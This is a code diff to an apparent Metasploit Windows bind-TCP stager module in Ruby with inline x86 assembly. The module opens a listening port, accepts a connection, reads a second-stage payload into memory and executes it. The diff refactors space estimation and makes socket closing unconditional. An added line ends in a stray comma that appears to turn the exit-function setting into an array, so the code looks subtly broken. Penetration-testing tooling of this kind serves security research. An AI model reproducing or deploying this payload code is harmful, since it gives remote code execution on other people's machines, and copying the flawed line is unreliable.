@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -16,35 +17,31 @@ module Msf
 
 module Payload::Windows::BindTcp
 
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
-
-  def close_listen_socket
-    datastore['StagerCloseListenSocket'].nil? || datastore['StagerCloseListenSocket'] == true
-  end
 
   #
   # Generate the first stage
   #
   def generate
-
-    # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_bind_tcp(
-        port:         datastore['LPORT'].to_i,
-        close_socket: close_listen_socket
-      )
-    end
-
     conf = {
-      port:         datastore['LPORT'].to_i,
-      exitfunk:     datastore['EXITFUNC'],
-      close_socket: close_listen_socket,
-      reliable:     true
+      port:     datastore['LPORT'],
+      reliable: false
     }
 
+    # Generate the more advanced stager if we have the space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:exitfunk] = datastore['EXITFUNC'],
+      conf[:reliable] = true
+    end
+
     generate_bind_tcp(conf)
+  end
+
+  def transport_config(opts={})
+    transport_config_bind_tcp(opts)
   end
 
   #
@@ -67,8 +64,7 @@ module Payload::Windows::BindTcp
   #
   def required_space
     # Start with our cached default generated size
-    # TODO: need help with this from the likes of HD.
-    space = 277
+    space = cached_size
 
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
@@ -77,11 +73,6 @@ module Payload::Windows::BindTcp
 
     # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
     space += 14
-
-    # if the payload doesn't need the listen socket closed then we save space. This is
-    # the case for meterpreter payloads, as metsrv now closes the listen socket once it
-    # kicks off (needed for more reliable shells).
-    space -= 8 unless close_listen_socket
 
     # The final estimated size
     space
@@ -97,7 +88,6 @@ module Payload::Windows::BindTcp
   def asm_bind_tcp(opts={})
 
     reliable     = opts[:reliable]
-    close_socket = opts[:close_socket]
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
 
     asm = %Q^
@@ -167,22 +157,12 @@ module Payload::Windows::BindTcp
         push edi               ; listening socket
         push 0xE13BEC74        ; hash( "ws2_32.dll", "accept" )
         call ebp               ; accept( s, 0, 0 );
-      ^
 
-      if close_socket
-        asm << %Q^
-          push edi               ; push the listening socket to close
-          xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
-          push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
-          call ebp               ; closesocket( s );
-        ^
-      else
-        asm << %Q^
-          xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
-        ^
-      end
+        push edi               ; push the listening socket
+        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
+        push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
+        call ebp               ; closesocket( s );
 
-      asm << %Q^
       recv:
         ; Receive the size of the incoming second stage...
         push 0                 ; flags
@@ -213,7 +193,6 @@ module Payload::Windows::BindTcp
         ; Receive the second stage and execute it...
         xchg ebx, eax          ; ebx = our new memory address for the new stage
         push ebx               ; push the address of the new stage so we can return into it
-
       read_more:               ;
         push 0                 ; flags
         push esi               ; length
